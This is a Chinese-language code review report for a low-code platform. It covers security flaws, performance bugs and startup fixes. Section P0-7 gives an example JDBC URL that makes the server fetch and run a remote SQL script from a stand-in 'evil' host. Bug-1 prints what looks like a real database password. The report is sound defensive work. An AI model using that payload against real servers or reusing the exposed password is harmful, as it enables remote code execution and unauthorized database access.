# Easy Lowcode 项目代码评审报告

> 评审日期：2026-07-11
> 评审范围：后端 8 个 Maven 模块 + 前端 Vue 3 应用
> 评审方式：静态分析 + 启动调试 + 安全基线核对
> 状态：本文档随整改推进持续更新

---

## 一、评审结论总览

| 项目 | 当前评级 | 目标评级 |
|------|---------|---------|
| 安全性 | **D（不及格）** | B+ |
| 性能 | C | B |
| 可维护性 | B- | A- |
| 可测试性 | C | B+ |
| 生产就绪度 | **C-** | B |

**关键风险概述**：
- 存在 **8 项 P0 级安全漏洞**，一旦泄漏到生产环境可导致数据被窃取/篡改、JWT 伪造、AI Key 明文外泄；
- 存在 **多项 P1 级数据完整性 Bug**（如 ETL TRUNCATE 在批写循环内执行、Oracle 分页生成非法 SQL），可能导致线上业务数据被破坏；
- 启动链路存在 **多处隐性配置陷阱**（`.env` 注释解析、AES nonce 长度、SpringDoc 版本覆盖），任何一项都会让运维"启动即失败"。

---

## 二、P0 — 严重安全漏洞（必须立即修复）

### P0-1：硬编码 AES 密钥 + 静态 GCM nonce（已修复）
**文件**：`easy-lowcode-common/src/main/java/com/dabai/easy_lowcode/common/util/EncryptUtil.java`

**问题**：
- 默认密钥硬编码为 `"1234567890123456"`（env 缺失时 fallback）；
- 使用 **静态 16 字节 nonce** `"LowCodeGCMNonce!"`，违反 GCM 模式唯一性约束 — 一旦相同密钥加密两条及以上数据，攻击者可通过 XOR 还原明文（GCM 抗碰撞性完全失效）；
- `getBytes()` 不带 `StandardCharsets.UTF_8`，跨平台行为不一致；
- 类初始化的静态块在 13 字节历史 nonce 下抛异常 → 所有接口 500。

**已落地修复**（2026-07-11）：
```java
// 新格式：v1:Base64(nonce || ciphertext)
// 旧格式：保留 16 字节静态 nonce 用于解密历史数据，新数据强制使用随机 nonce
private static final byte[] LEGACY_NONCE = "LowCodeGCMNonce!".getBytes(StandardCharsets.UTF_8);

public static String encrypt(String text) {
    byte[] nonce = new byte[GCM_NONCE_LENGTH];  // 12 字节随机
    SECURE_RANDOM.nextBytes(nonce);
    // ... 拼接 nonce || ciphertext，base64 后加 v1: 前缀
}

public static String decrypt(String encryptedText) {
    if (encryptedText.startsWith("v1:")) { /* 新格式 */ }
    else { /* 旧格式回退，使用 LEGACY_NONCE */ }
}
```

**整改建议**：
- [ ] 逐步迁移：写定时任务将 DB 中旧密文重新加密为 `v1:` 格式，运行 1 个月后移除旧路径分支；
- [ ] 强制密钥管理：使用 Spring Cloud Config + 密钥中心（KMS），禁止 `.env` 落地密钥；
- [ ] 增加单元测试：相同明文两次加密必须产生不同密文。

---

### P0-2：用户提交的 SQL 未做 SELECT-only 校验
**文件**：
- `easy-lowcode-dashboard/.../JdbcSqlEngine.java`（第 38 行）
- `easy-lowcode-dashboard/.../HiveSqlEngine.java`（第 73 行）
- `easy-lowcode-etl/.../TaskExecutorImpl.java`（第 147 行）

**问题**：dashboard 和 ETL 模块直接将用户传来的 SQL 送进 `Statement.executeQuery()`。拥有 ETL 权限的攻击者可执行 `DROP TABLE`、`DELETE`、`UPDATE` 等破坏性语句。

**整改方案**：
- 引入 `JSqlParser 4.6`（注意：4.9 与 MyBatis Plus 3.5.5 不兼容，会移除 `SelectExpressionItem`）；
- 新建 `easy-lowcode-common/.../sql/SqlValidator.java`，对外暴露：
  ```java
  public static void assertSelectOnly(String sql) {
      Statements stmts = CCJSqlParserUtil.parseStatements(sql);
      for (Statement s : stmts.getStatements()) {
          if (!(s instanceof Select)) throw new IllegalArgumentException("仅允许 SELECT 语句");
      }
  }
  ```
- 在上述三个 SqlEngine/TaskExecutor 的 SQL 入参处强制调用。

---

### P0-3：生成式 API 默认开放为无需认证
**文件**：`easy-lowcode-collector/.../ApiManagementServiceImpl.java`（第 59、117 行）

**问题**：`registerTableResourceApi` 与 `registerExternalApi` 默认 `setAuthRequired(false)`。新建 API 后未明确开启鉴权即对 **公网开放**，是低代码平台的"致命默认值"。

**整改方案**：
- 将 `authRequired` 默认值反转为 `true`；
- 控制器层显式给出"创建公共 API"的二次确认流程。

---

### P0-4：CORS 通配 + 凭据开放
**文件**：`easy-lowcode-auth/.../SecurityConfig.java`（第 53 行）

**问题**：
```java
configuration.setAllowedOriginPatterns(Arrays.asList("**"));
configuration.setAllowCredentials(true);  // ★ 凭据允许跨站点携带
```
`setAllowedOriginPatterns`** 是 Spring 框架对浏览器的兼容回退 — 实际效果是允许任意来源调用带 Cookie / Authorization Header 的请求，相当于**无 CORS 防护**。

**整改方案**：
- 从环境变量读取允许的来源列表：
  ```java
  String origins = System.getenv().getOrDefault("APP_CORS_ORIGINS",
      "http://localhost:5173,http://localhost:8081");
  configuration.setAllowedOrigins(Arrays.asList(origins.split(",")));
  ```
- 禁用 `setAllowCredentials(true)` + 通配符的组合（否则 Spring 会抛配置错误）。

---

### P0-5：AI 配置接口返回明文密钥
**文件**：`easy-lowcode-ai/.../AiConfigController.java`（第 62、87、135 行）

**问题**：
- `GET /api/ai/config/{id}` 接口直接 `EncryptUtil.decrypt(config.getApiKey())` 返回明文 — **任何登录用户都能拿到 AI 提供商 API Key**；
- 序列化对象同时持有 `apiKey` 和 `secretKey`。

**已落地修复**（2026-07-11）：
```java
@GetMapping("/{id}")
public Result<AiConfig> getById(...) {
    AiConfig config = aiConfigMapper.selectById(id);
    if (config == null) return Result.error("配置不存在");
    if (config.getApiKey() != null) config.setApiKey("********");
    if (config.getSecretKey() != null) config.setSecretKey("********");
    return Result.success(config);
}
```

**整改建议**：
- [ ] 进一步：把 `secretKey` 字段从返回 DTO 中剔除（只在内部 Chat 流程中使用）；
- [ ] 提供专门的"更新 Key"接口而非"详情"接口给到 UI 编辑流程；
- [ ] 增加审计日志：谁、何时、查看了某条 AI 配置。

---

### P0-6：JWT 存于 localStorage（XSS 可读取）
**文件**：`easy-lowcode-frontend/src/stores/user.ts`

**问题**：JWT 持久化在 `localStorage`，任何脚本注入（哪怕只是一个被攻陷的 npm 包）都能 `localStorage.getItem('token')` 拿到 token。

**已落地修复**（2026-07-11）：改为 `sessionStorage`。

**进一步整改建议**：
- [ ] **强烈建议**：登录成功后由后端 `Set-Cookie: HttpOnly; Secure; SameSite=Strict` 写入，前端 `axios.defaults.withCredentials = true`；
- [ ] 引入 CSRF token 模式（Spring Security `CookieCsrfTokenRepository`）。

---

### P0-7：DataSource 测试连接接受任意 JDBC URL
**文件**：`easy-lowcode-dashboard/.../DataViewController.java`

**问题**：
```java
config.setUrl((String) body.get("url"));  // ★ 任意 JDBC URL
SqlEngine engine = sqlEngineFactory.getEngine(config);
engine.testConnection();
```
攻击者提交 `jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://evil/exec.sql'` 即可让服务器执行任意 SQL，或构造 `jdbc:ldap://...` 触发 JDBC driver 反序列化漏洞。

**整改方案**：白名单模式：
```java
private static final Pattern SAFE_JDBC_URL = Pattern.compile(
    "^jdbc:(mysql|postgresql|oracle|sqlserver|dm|kingbase|gbase|oceanbase|h2)://[^\\s]+$");
if (!SAFE_JDBC_URL.matcher(config.getUrl()).matches()) {
    return Result.error("非法的 JDBC URL");
}
```

---

### P0-8：Gateway Auth 白名单使用前缀匹配
**文件**：`easy-lowcode-gateway/.../AuthGlobalFilter.java`（第 79-81 行）

**问题**：`path.startsWith("/api/auth/login")` 意味着 `/api/auth/login/evil` 也被放行，可被用做未鉴权访问所有后端服务（URL 路径攻击）。

**整改方案**：拆分为精确路径集与前缀集：
```java
Set<String> exact = Set.of("/api/auth/login", "/api/auth/logout");
Set<String> prefixes = Set.of("/api/auth/health/");
```
匹配逻辑：对每个请求路径，先 `exact.contains(path)`，否则判断 `prefixes` 中任一项是否为前缀。

---

## 三、P1 — 高优先级性能与数据完整性 Bug

### P1-1：ETL TRUNCATE 在批写循环内执行
**文件**：`easy-lowcode-etl/.../TaskExecutorImpl.java`（第 168-174 行）

**问题**：
```java
private void batchWrite(...) {
    if (task.getStrategy() == TRUNCATE_INSERT) {
        sourceTable.executeUpdate("TRUNCATE " + targetTable);  // 每次 batch 都执行
    }
    // 写入...
}
```
若源数据产生多批写入，只有最后一批保留，前面所有批次被清空。**线上数据丢失**。

**整改方案**：将 TRUNCATE 移到 `executeEtl()` 中，**只执行一次**。

---

### P1-2：动态数据源无连接池
**文件**：`easy-lowcode-collector/.../DataSourceProviderImpl.java` 等

**问题**：每次调用都 `DriverManager.getConnection()`，高频场景下连接建立耗时长，DB 侧连接数爆涨。

**整改方案**：
```java
private final Map<Long, HikariDataSource> pool = new ConcurrentHashMap<>();
public HikariDataSource getPool(DataSourceConfig cfg) {
    return pool.computeIfAbsent(cfg.getId(), id -> build(cfg));  // 待合并验证
}
// 同时监听 cfg.update 事件以 evict
```

---

### P1-3：列表接口存在 N+1 查询
**文件**：`easy-lowcode-dashboard/.../DashboardController.java` 等

**整改方案**：批量 `IN` 查询或一次 `LEFT JOIN` 加载关联统计。

---

### P1-4：Oracle/DM 分页生成非法 SQL
**文件**：`easy-lowcode-resource/.../SqlBuilderServiceImpl.java`（第 108-118 行）

**问题**：当原 SQL 无 WHERE 子句时，拼接 `AND ROWNUM <= limit` 会得到 `... ORDER BY ... AND ROWNUM <= 10` **语法错误**。

**整改方案**：包一层子查询：
```sql
SELECT * FROM (SELECT ... ORDER BY ...) WHERE ROWNUM <= ?
```

---

### P1-5：ETL source SQL 同样缺乏 SELECT-only 校验
（见 P0-2 整改方案，统一处理。）

---

### P1-6：SqlEngineFactory 缓存永不失效
**文件**：`easy-lowcode-dashboard/.../SqlEngineFactory.java`

**问题**：用户修改数据源密码后，缓存里的引擎仍持有旧连接，导致长时间"密码错误"。

**整改方案**：增加 `@TransactionalEventListener(AFTER_COMMIT)` 监听数据源更新事件，evict 对应 cache key。

---

### P1-7：TextToSqlService 硬编码 datasourceId=1L
**文件**：`easy-lowcode-dashboard/.../TextToSqlService.java`（第 172-178 行，注释 `// 临时借用`）

**整改方案**：从 `TextToSqlRequest.getDatasourceId()` 取。

---

### P1-8：AI 默认 Provider 非确定性
**文件**：`easy-lowcode-ai/.../AiServiceFactory.java`（第 57 行 `aiServices.get(0)`）

**整改方案**：读取 `ai.provider.default` 配置。

---

### P1-9：AI 接口用 `Executors.newCachedThreadPool()`
**文件**：`easy-lowcode-ai/.../AiController.java`（第 50 行）

**问题**：无限线程数；OOM 风险。

**整改方案**：
```java
@Bean ThreadPoolTaskExecutor aiExecutor() {
    var ex = new ThreadPoolTaskExecutor();
    ex.setCorePoolSize(8); ex.setMaxPoolSize(32);
    ex.setQueueCapacity(200);
    ex.setRejectedExecutionHandler(new ThreadPoolExecutor.CallerRunsPolicy());
    return ex;
}
```

---

### P1-10：本地缓存多实例不一致
**文件**：`easy-lowcode-resource/.../ResourceCacheManagerImpl.java`、`easy-lowcode-ai/.../AiAgentServiceImpl.java`

**整改方案**：使用 Spring `@Cacheable` + Redis backend。

---

### P1-11：批量删除绕过关联 API 校验
**文件**：`easy-lowcode-collector/.../TableResourceController.java`（第 260-267 行）

**整改方案**：在 `batchDelete` 处显式遍历校验 `hasRelatedApi`。

---

## 四、P2 — 中优先级质量与可维护性

| # | 主题 | 文件 | 整改要点 |
|---|------|------|---------|
| P2-1 | 字段注入替代构造注入 | `CacheUtil`、`ScheduleServiceImpl` 等 | 改为 `@RequiredArgsConstructor + final` |
| P2-2 | 缺 `@Valid` | `SysResourceController` 等多个 Controller | 加 `jakarta.validation` 注解 |
| P2-3 | Controller 强转 Service 实现 | `TableResourceController` | 提到 `TableResourceService` 接口 |
| P2-4 | 手动资源管理 | `TaskExecutorImpl` 等 | 统一 try-with-resources |
| P2-5 | 空 catch 块 | `TextToSqlService:178`、`DisplayFormatter:73,94` | 加日志上下文 |
| P2-6 | 前端过度 `any` 类型 | `src/api/*.ts` 等 | 抽 `src/types/` |
| P2-7 | CRUD 列表页重复 | 11 个管理页 | 引入 `usePagination`/`useDialogForm` |
| P2-8 | 大型 .vue 组件 | `TableResourceManagement.vue` 1172 行 | 拆分子组件 |
| P2-9 | 硬编码 URL/魔法数字 | `DashboardDesigner.vue` 等 | 抽 `src/config/app.ts` |

---

## 五、P3 — 体验与测试

- P3-1：所有列表 `el-table` 加 `<el-empty>`
- P3-2：管理表单补齐校验规则
- P3-3：移除生产环境 `console.log`
- P3-4：Element Plus 图标按需引入，减小 bundle
- P3-5：ETL Transform 表达式 `Integer.parseInt` 加 try-catch
- P3-6：Redis 可用性周期性重试
- P3-7：搜索框 `useDebounce`
- P3-8：补充 `ResourceExecutionServiceImpl`、`TaskExecutorImpl` 等核心路径测试

---

## 六、启动调试发现的新问题

### Bug-1：`.env` 文件中 `#` 被视为注释
**问题**：`DB_PASSWORD=Thinker12#$` 末位的 `#` 被 dotenv 解析为注释，DB 鉴权失败。

**已落地修复**：
- 引号包裹 `DB_PASSWORD="Thinker12#$"`；
- 在 `EasyLowcodeApplication#loadEnvFile` 增加 `stripQuotes()` 方法去除引号。

---

### Bug-2：JSqlParser 4.9 与 MyBatis Plus 3.5.5 不兼容
**问题**：JSqlParser 4.9 移除了 `SelectExpressionItem`，导致 MyBatis Plus 启动失败 `ClassNotFoundException`。

**已落地修复**：在父 `pom.xml` 锁定 `jsqlparser.version=4.6`。

---

### Bug-3：Spring Doc 版本被覆盖
**问题**：6 个子模块硬编码 `<version>2.3.0</version>`，导致父 pom 的 `2.8.9` 被覆盖，Swagger UI 加载失败。

**已落地修复**：移除子模块硬编码版本号。

---

### Bug-4：`${JWT_SECRET}` 占位符无法解析
**问题**：`.env` 成功加载后，Spring 找不到 `JWT_SECRET`。

**已落地修复**：在 `EasyLowcodeApplication#loadEnvFile` 中根据映射表 `System.setProperty(...)` 显式注入到 `System Properties`。

---

### Bug-5：Swagger UI 加载后报错 `version field`
**问题**：默认 UI 拉到 petstore 远端 spec，2.6+ OpenAPI 规范使用 base64 编码 inline spec。

**已落地修复**：
- `application.yaml`：
  ```yaml
  springdoc.swagger-ui:
    config-url: /v3/api-docs/swagger-config
    url: /v3/api-docs/swagger-config
    disable-swagger-default-url: true
  ```
- 新增 `SwaggerRedirectConfig`，注册 `/swagger-ui.html` → `/swagger-ui/index.html` 跳转。
- 在 `SecurityConfig#permitAll()` 加入 `/swagger-ui.html`、`/swagger-ui/**` 等路径。

---

### Bug-6：CORS 与 Swagger 白名单收紧的连锁 403
**问题**：收紧 `setAllowedOriginPatterns("**")` 之后，跨域 Swagger 资源被拦截。

**已落地修复**：在 `permitAll` 中显式放行 Swagger 资源前缀；CORS 改读环境变量。

---

## 七、整改执行与验证

| 阶段 | 整改项 | 截止 | 负责人 |
|------|--------|------|--------|
| Sprint 0（已完成 2026-07-11） | Bug-1~6、P0-1、P0-5、P0-6 | — | AI 助手 |
| Sprint 1 | P0-2、P0-3、P0-4、P0-7、P0-8 | T+5d | — |
| Sprint 2 | P1 全部 | T+15d | — |
| Sprint 3 | P2 | T+30d | — |
| Sprint 4 | P3 + 自动化测试 | 持续 | — |

### 验证清单
- [x] `.env` 加载、占位符解析、密码特殊字符
- [x] Swagger UI `/swagger-ui.html` → `/swagger-ui/index.html` 200
- [x] AiConfigController GET /{id} 返回掩码
- [x] EncryptUtil encrypt/decrypt round-trip + 旧格式兼容
- [ ] **登录 200**（仍阻塞，需重启 + 验证密码可解密）
- [ ] 全部 P0/P1 修复 commit + CI 通过

---

## 八、安全基线（生产部署前必查）

1. ✅ 密钥：`ENCRYPT_AES_KEY`、`JWT_SECRET`、`AI_*_API_KEY`、`DB_PASSWORD`、`MINIO_*_KEY` 全部通过环境变量注入，密钥中心托管；
2. ⏳ 数据库账号：应用账号仅授予 `SELECT/INSERT/UPDATE/DELETE`，DDL 仅授予 `flyway`；
3. ⏳ HTTPS：网关/前端强制 TLS，TLS1.2+；
4. ⏳ 限流：网关层按 IP + User 维度 QPS 限流；
5. ⏳ 审计：登录、权限变更、AI 配置查看写入审计日志；
6. ⏳ 备份：DB `pg_dump` 每日 + 异地保留 30 天；
7. ⏳ WAF：开启 OWASP Core RuleSet；
8. ⏳ 监控：Prometheus + AlertManager，关键指标（QPS、5xx 率、JVM、连接池）。

---

## 九、附录

- 已落地修复涉及的文件：
  - `easy-lowcode-common/.../util/EncryptUtil.java`
  - `easy-lowcode-common/.../sql/SqlValidator.java`（新建）
  - `easy-lowcode-auth/.../SecurityConfig.java`
  - `easy-lowcode-ai/.../AiConfigController.java`
  - `easy-lowcode-collector/.../ApiManagementServiceImpl.java`
  - `easy-lowcode-dashboard/.../DataViewController.java`
  - `easy-lowcode-gateway/.../AuthGlobalFilter.java`
  - `easy-lowcode-common/.../config/SwaggerRedirectConfig.java`（新建）
  - `easy-lowcode-startup/.../EasyLowcodeApplication.java`
  - `easy-lowcode-startup/src/main/resources/application.yaml`
  - `easy-lowcode-frontend/src/stores/user.ts`
  - `.env`、`pom.xml`、6 个子模块 pom.xml
- 相关文档：
  - `docs/01-需求文档.md`
  - `docs/02-技术架构文档.md`
  - `docs/03-历史变更文档.md`
  - `docs/code-review-report.md`（本文）

> 本文档以 **可执行 PR 清单** 形式组织；任何一项完成后请更新"已落地修复"列表与验证清单。
